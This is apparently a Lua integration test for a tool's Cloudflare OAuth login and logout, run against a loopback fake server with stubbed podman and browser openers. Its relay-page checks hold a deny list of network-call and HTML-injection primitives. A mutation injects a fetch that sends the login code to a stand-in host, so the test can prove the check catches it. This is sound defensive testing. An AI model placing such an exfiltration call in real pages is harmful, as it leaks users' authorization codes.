-- @env PATH HOME CARGO_TARGET_DIR TILLANDSIAS_CLOUDFLARE_LOGIN_BIN
-- @trace order:1505-kc5f, order:1758-wdvf, order:1713-3v3f, order:1770-z575, order:2382-ubmc
--
-- test-cloudflare-login.lua — tillandsias --cloudflare-login and --cloudflare-logout against
-- tillandsias-fake-cloudflare. Ported from the .sh of the same name (2382-ubmc). No real Cloudflare,
-- Vault or credential: every server is loopback.
--
--   BIN    the real binary, with a podman that records its argv and exits 125, so it cannot reach
--          this host's Vault. Every arm that ends before the store.
--   CARGO  the same login() and logout() in-process against the same fake, with the in-memory Vault
--          seam: the arms that store, which no environment switch may point elsewhere.
--   RELAY  the relay page never calls out and reports its copy, each with a mutation.
--
-- The binary PRINTS the authorize URL and never opens a browser (1713-3v3f), so the operator is
-- `click`: it waits for the printed URL, consents at the fake and follows the redirect. A `xdg-open`
-- and an `open` on PATH only record being launched.
--
-- TILLANDSIAS_CLOUDFLARE_LOGIN_BIN=<path> runs the BIN arms against another binary: a pre-1505-kc5f
-- one fails every BIN arm, which is this test's negative control.
--
-- Usage: tillandsias-plan script run scripts/lua/test-cloudflare-login.lua
-- Verdict: ok:cloudflare-login:<n> arms | violation:... | skip:...:no-cargo, no-linker, no-curl

local fixture = require "common.fixture"
local T = fixture.new("cloudflare-login")
local SH = fixture.posix_shell()
if not fixture.which("curl") then T:skip("no-curl") end
local C = require("common.cargotest").new(T)
local built, FAKE = C:build("tillandsias-headless", "tillandsias", "tillandsias-fake-cloudflare")
local other = env.get("TILLANDSIAS_CLOUDFLARE_LOGIN_BIN")
local BIN = other and other ~= "" and other or built
local w = T:scratch()
fs.mkdir(w.rel .. "/fakebin"); fs.mkdir(w.rel .. "/home")
fs.write(w.rel .. "/fakebin/click", [==[#!/usr/bin/env bash
out="$1"; i=0; url=""
while [ "$i" -lt 300 ]; do
    url="$(grep -m1 -oE 'http://127\.0\.0\.1:[0-9]+/oauth2/auth[^[:space:]]*' "$out" 2>/dev/null)"
    [ -n "$url" ] && break
    sleep 0.1; i=$((i + 1))
done
[ -n "$url" ] || exit 0
printf '%s\n' "$url" >"$CF_FAKE_BROWSER_DIR/url"
loc="$(curl -s --noproxy '*' -o /dev/null -w '%{redirect_url}' "${url}&auto=${CF_FAKE_BROWSER_MODE:-approve}")"
[ "${CF_FAKE_BROWSER_TAMPER:-0}" = 1 ] && loc="${loc/state=/state=forged}"
printf '%s\n' "$loc" >"$CF_FAKE_BROWSER_DIR/location"
curl -s --noproxy '*' -o /dev/null "$loc" || true
]==])
fs.write(w.rel .. "/fakebin/xdg-open", '#!/usr/bin/env bash\nprintf \'%s\\n\' "$*" >>"$CF_FAKE_BROWSER_DIR/launched"\n')
fs.write(w.rel .. "/fakebin/open", fs.read(w.rel .. "/fakebin/xdg-open"))
fs.write(w.rel .. "/podman.log", "")
fs.write(w.rel .. "/fakebin/podman", "#!/bin/sh\nprintf '%s\\n' \"$*\" >>\"" .. w.abs .. "/podman.log\"\nexit 125\n")
for _, b in ipairs{ "click", "xdg-open", "open", "podman" } do T:must{ "chmod", "755", w.abs .. "/fakebin/" .. b } end
-- A control socket lives in the runtime dir, and a socket path has a limit: a short one, under TMPDIR.
local SCRIPT = [==[
set -u
W="$1"; N="$2"; FAKE="$3"; BIN="$4"; shift 4
B="$W/$N.browser"; mkdir -p "$B"; : >"$W/$N.ledger"; : >"$W/$N.out"
RUN="$(mktemp -d "${TMPDIR:-/tmp}/cfl.XXXXXX")"; chmod 700 "$RUN"; FP=""; CP=""; BP=""; WD=""
trap 'for p in $CP $BP $WD $FP; do kill "$p" 2>/dev/null; done; rm -rf "$RUN"' EXIT
fe=(); be=()
while [ "$1" != "--" ]; do fe+=("$1"); shift; done; shift
while [ "$1" != "--" ]; do be+=("$1"); shift; done; shift
env ${fe[@]+"${fe[@]}"} "$FAKE" --ledger "$W/$N.ledger" >"$W/$N.port" 2>/dev/null </dev/null & FP=$!
i=0; port=""; while [ "$i" -lt 100 ]; do read -r port <"$W/$N.port" 2>/dev/null && [ -n "$port" ] && break; sleep 0.1; i=$((i + 1)); done
[ -n "$port" ] || { echo "fake=no-port"; exit 0; }
# One 60 s watchdog. A failed image build is retried after 30 and 120 s (1776-brk3); the seam shortens it.
common=(NO_PROXY='127.0.0.1,localhost' no_proxy='127.0.0.1,localhost' PATH="$W/fakebin:$PATH" HOME="$W/home" XDG_RUNTIME_DIR="$RUN"
    DBUS_SESSION_BUS_ADDRESS='unix:path=/nonexistent/bus' TILLANDSIAS_PODMAN_BIN="$W/fakebin/podman" TILLANDSIAS_PODMAN_REFUSE_REAL=1
    TILLANDSIAS_NO_TRAY=1 NO_COLOR=1 TILLANDSIAS_IMAGE_RETRY_BASE_MS=50 TILLANDSIAS_CLOUDFLARE_BASE_URL="http://127.0.0.1:$port"
    TILLANDSIAS_CLOUDFLARE_CLIENT_ID=fake-client CF_FAKE_BROWSER_DIR="$B")
env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u ALL_PROXY "${common[@]}" ${be[@]+"${be[@]}"} "$BIN" "$@" >"$W/$N.out" 2>&1 </dev/null & BP=$!
( sleep 60; kill "$BP" 2>/dev/null ) >/dev/null 2>&1 & WD=$!
case " ${be[*]+"${be[*]}"} " in *" CF_FAKE_BROWSER_MODE="*) env CF_FAKE_BROWSER_DIR="$B" ${be[@]+"${be[@]}"} bash "$W/fakebin/click" "$W/$N.out" >/dev/null 2>&1 & CP=$! ;; esac
rc=0; wait "$BP" || rc=$?; BP=""
echo "rc=$rc"
]==]
local looked = 0
local function read(f) return fs.exists(w.rel .. "/" .. f) and fs.read(w.rel .. "/" .. f):gsub("\r", "") or "" end
local function paths(ledger)
    local l = {}
    for p in ledger:gmatch('"path":"([^"?]*)') do l[#l + 1] = p end
    return l
end
local function past_auth(l)
    local after, seen = {}, false
    for _, p in ipairs(l) do
        if seen then after[#after + 1] = p end
        if p == "/oauth2/auth" then seen = true end
    end
    return after
end
-- name, the fake's environment, the binary's, its arguments.
local function bin(name, fake_env, bin_env, ...)
    local a = { SH, "-s", "--", w.abs, name, FAKE, BIN }
    for _, l in ipairs{ fake_env, bin_env } do
        for _, v in ipairs(l) do a[#a + 1] = v end
        a[#a + 1] = "--"
    end
    for _, v in ipairs{ ... } do a[#a + 1] = v end
    local r = proc.run{ argv = a, cwd = w.abs, stdin = SCRIPT, env_unset = { "TILLANDSIAS_*", "LITMUS_*", "CF_*" }, timeout_ms = 120000 }
    looked = looked + 1
    local x = { rc = tonumber((r.stdout or ""):match("rc=(%d+)")), out = "\n" .. read(name .. ".out"), ledger = read(name .. ".ledger"), url = read(name .. ".browser/url"), launched = read(name .. ".browser/launched") }
    x.paths = paths(x.ledger)
    x.code = read(name .. ".browser/location"):match("[?&]code=([^&%s]*)")
    x.why = "rc=" .. tostring(x.rc) .. " " .. (r.stdout or ""):sub(1, 60) .. " paths=" .. table.concat(x.paths, " ") .. " " .. x.out:sub(1, 400)
    return x
end
local function asked(x, p)
    for _, q in ipairs(x.paths) do
        if q == p then return true end
    end
    return false
end
local function says(x, line) return text.contains(x.out .. "\n", "\n" .. line .. "\n") end
local function refuses(x, line) return x.rc ~= nil and x.rc ~= 0 and says(x, line) end
local function no_leak(label, x, secret)
    -- An empty probe would pass without having looked.
    T:arm("NOLEAK " .. label, secret ~= nil and #secret >= 8 and not text.contains(x.out, secret) and not text.contains(x.out, "code_verifier"), secret and "leaked, or too short" or "no secret to look for")
end
local LOOP, APPROVE, DENY = { "--cloudflare-login", "--via", "loopback" }, "CF_FAKE_BROWSER_MODE=approve", "CF_FAKE_BROWSER_MODE=deny"
local x = bin("deny", {}, { DENY }, table.unpack(LOOP))
T:arm("DENY is refused as access-denied, with a remedy", refuses(x, "refused:cloudflare-login:access-denied") and text.contains(x.out, "\n  remedy: "), x.why)
T:arm("DENY nothing is asked past /oauth2/auth", asked(x, "/oauth2/auth") and #past_auth(x.paths) == 0, x.why)
x = bin("state", {}, { APPROVE, "CF_FAKE_BROWSER_TAMPER=1" }, table.unpack(LOOP))
T:arm("STATE a tampered state is refused", refuses(x, "refused:cloudflare-login:state-mismatch"), x.why)
T:arm("STATE and makes no token request", asked(x, "/oauth2/auth") and not asked(x, "/oauth2/token"), x.why)
no_leak("state", x, x.code)
x = bin("novault", {}, { APPROVE }, table.unpack(LOOP))
T:arm("NOVAULT approved, Vault cannot start: refused before the code is spent", refuses(x, "refused:cloudflare-login:vault:vault-start-failed") and asked(x, "/oauth2/auth") and not asked(x, "/oauth2/token"), x.why)
T:arm("NOVAULT a stopped Vault is started, alone", text.contains(x.out, "\nnote:cloudflare-store:vault-not-running:starting-the-vault-enclave-only"), x.why)
T:arm("NOVAULT the remedy is the tray, never --init", text.contains(x.out, "start Tillandsias (the tray)") and not text.contains(x.out, "tillandsias --init"), x.why)
local wrong, podman = {}, read("podman.log")
for l in podman:gmatch("[^\n]+") do
    if (" " .. l .. " "):find(" build ", 1, true) and not l:lower():find("vault", 1, true) then wrong[#wrong + 1] = l end
end
T:arm("NOVAULT podman was asked, and never to build another image", podman ~= "" and #wrong == 0, table.concat(wrong, " | "):sub(1, 300))
no_leak("novault", x, x.code)
-- 1954-cfqr: an EMPTY relay URL is the documented retreat from the default relay.
x = bin("norelay", {}, { "TILLANDSIAS_CLOUDFLARE_RELAY_URL=" }, "--cloudflare-login", "--via", "qr")
T:arm("NORELAY --via qr refuses, naming loopback and paste", refuses(x, "refused:cloudflare-login:no-relay-configured") and text.contains(x.out, "--via loopback") and text.contains(x.out, "--via paste"), x.why)
T:arm("NORELAY before any request", x.ledger == "", x.why)
local RELAY = "https://relay.example.invalid/tillandsias/cloudflare/callback"
x = bin("qr", {}, { "LITMUS_PODMAN_MODE=1", "TILLANDSIAS_CLOUDFLARE_RELAY_URL=" .. RELAY }, "--cloudflare-login", "--via", "qr")
local STOP = "\nskip:cloudflare-login:litmus-stop-before-exchange"
T:arm("QR the code and the URL are shown, then the litmus stop", x.rc == 0 and text.contains(x.out, STOP) and text.contains(x.out, "Or open: "), x.why)
x = bin("litmus", {}, { "LITMUS_PODMAN_MODE=1", APPROVE }, table.unpack(LOOP))
local only = #x.paths > 0
for _, p in ipairs(x.paths) do only = only and p == "/.well-known/openid-configuration" end
T:arm("LITMUS stops before the browser, the receiver and the exchange", x.rc == 0 and text.contains(x.out, STOP) and only and x.url == "", x.why)
x = bin("litmusctl", {}, { DENY }, table.unpack(LOOP))
T:arm("LITMUS CONTROL without the flag the printed URL is followed", not text.contains(x.out, "litmus-stop") and x.url ~= "", x.why)
x = bin("pastetty", {}, {}, "--cloudflare-login", "--via", "paste")
T:arm("PASTE without a terminal it refuses, asking for a code, before any request", refuses(x, "refused:cloudflare-login:paste-needs-a-terminal") and text.contains(x.out, "CODE (not a token)") and x.ledger == "", x.why)
x = bin("argv", {}, {}, "--cloudflare-login", "--via", "paste", "CODEONARGV-0123456789")
T:arm("ARGV a code on argv is refused (2)", x.rc == 2 and says(x, "refused:cloudflare-login:unsupported-argument"), x.why)
no_leak("argv", x, "CODEONARGV-0123456789")
x = bin("device", { "TILLANDSIAS_FAKE_CLOUDFLARE_GRANT_TYPES=authorization_code,refresh_token,urn:ietf:params:oauth:grant-type:device_code" }, {}, "--cloudflare-login")
T:arm("DEVICE the default takes the grant, shows the code, and refuses at the Vault before a poll", refuses(x, "refused:cloudflare-login:vault:vault-start-failed") and text.contains(x.out, "enter the code: WDJB-MJHT") and asked(x, "/oauth2/device/auth")
    and not asked(x, "/oauth2/token"), x.why)
x = bin("devicectl", {}, { DENY }, "--cloudflare-login")
T:arm("DEVICE CONTROL without the grant in discovery it is never asked", #x.paths > 0 and not asked(x, "/oauth2/device/auth") and not text.contains(x.out, "enter the code"), x.why)
T:arm("LEDGER CONTROL a token request past the consent is seen", past_auth(paths('{"path":"/oauth2/auth?x=1"}\n{"path":"/oauth2/token"}\n'))[1] == "/oauth2/token", "blind")
local launched = {}
for _, n in ipairs{ "deny", "state", "novault", "norelay", "qr", "litmus", "litmusctl", "pastetty", "argv", "device", "devicectl" } do
    if read(n .. ".browser/launched") ~= "" then launched[#launched + 1] = n end
end
T:arm("NOLAUNCH no arm launched a browser opener", looked == 11 and #launched == 0, looked .. " " .. table.concat(launched, " "))

local PAGE = fs.read("assets/cloudflare-relay/index.html"):gsub("\r", "")
local function has_tag(b, tag) return b:find("<" .. tag, 1, true) ~= nil end
local function page_ok(src)
    local b = src:gsub("<!%-%-.-%-%->", "")
    for _, s in ipairs{ "connect-src 'none'", "default-src 'none'", "new URLSearchParams(window.location.search)", '"code=" + code + "&state=" + state', "textContent", "history.replaceState" } do
        if not text.contains(b, s) then return false end
    end
    for _, s in ipairs{ "fetch(", "XMLHttpRequest", "sendBeacon", "WebSocket", "EventSource", "import(", "href=", "innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "http://", "https://" } do
        if text.contains(b, s) then return false end
    end
    for _, t in ipairs{ "form", "img", "link", "iframe", "object", "embed" } do
        if has_tag(b, t) then return false end
    end
    return b:find("%ssrc=") == nil
end
local function copy_ok(b) return text.contains(b, "writeText(line).then(") and text.contains(b, "selectNodeContents") and text.contains(b, "Copied.") and text.contains(b, "press Ctrl+C") end
local function swap(a, b)
    local at, z = PAGE:find(a, 1, true)
    return at and PAGE:sub(1, at - 1) .. b .. PAGE:sub(z + 1)
end
T:arm("RELAY the page is static and never calls out", page_ok(PAGE), "it can, or it does not show code and state")
T:arm("RELAY the copy is awaited, with a fallback and feedback", copy_ok(PAGE), "it is not")
for _, c in ipairs{ { "a page that calls out", page_ok, 'show("manual");', 'show("manual"); fetch("https://x.invalid/?" + line);' }, { "dropping connect-src 'none'", page_ok, "connect-src 'none'; ", "" }, { "an unawaited copy", copy_ok, "writeText(line).then(", "writeText(line);(" } } do
    local m = swap(c[3], c[4])
    T:arm("RELAY CONTROL " .. c[1] .. " is caught", m ~= nil and not c[2](m), m and "not caught" or "the mutation did not reach")
end

local y = C:test({ "-p", "tillandsias-headless", "--bin", "tillandsias", "cloudflare_login::tests::", "--", "--include-ignored" }, { TILLANDSIAS_FAKE_CLOUDFLARE_BIN = FAKE, CF_LOGIN_QR_CAPTURE = w.abs .. "/qr.out", CF_LOGIN_QR_RELAY = RELAY })
for _, a in ipairs{ "login_fake_loopback_approve_stores", "login_fake_deny_writes_nothing", "login_fake_state_mismatch_makes_no_exchange", "login_fake_qr_relay_poll_stores_and_qr_is_only_the_url", "login_binary_qr_capture_is_only_the_authorize_url",
    "login_fake_paste_stores", "login_fake_litmus_stops_before_exchange", "logout_fake_deletes_pair_keeps_mesh", "logout_deletes_the_pair_and_keeps_mesh", "logout_refuses_when_vault_is_unreadable", "login_state_is_checked_before_error_and_code",
    "login_loopback_takes_exactly_one_callback_then_closes", "login_loopback_wrong_state_is_refused_and_closes", "login_loopback_times_out_and_closes", "login_loopback_binds_127_0_0_1_on_registered_ports_only",
    "login_vault_preflight_refuses_before_the_code_is_spent", "login_exchange_refusal_carries_no_response_bytes", "login_and_logout_refuse_in_a_forge_without_touching_anything", "login_qr_without_relay_is_refused_before_any_network_call",
    "login_paste_without_a_terminal_is_refused_before_any_network_call", "login_relay_poll_state_first_then_code", "login_paste_needs_the_state_with_the_code", "login_parse_args",
    "login_fake_device_approve_stores_and_qr_is_only_the_verification_uri", "login_fake_device_slow_down_widens_and_still_stores", "login_fake_device_deny_and_expire_store_nothing", "login_fake_device_refused_falls_back_and_no_grant_never_asks" } do
    T:arm("CARGO cloudflare_" .. a, y:ok("cloudflare_login::tests::cloudflare_" .. a), y:tail())
end
T:arm("CARGO cargo test passed", y.rc == 0, y:tail())
T:finish()
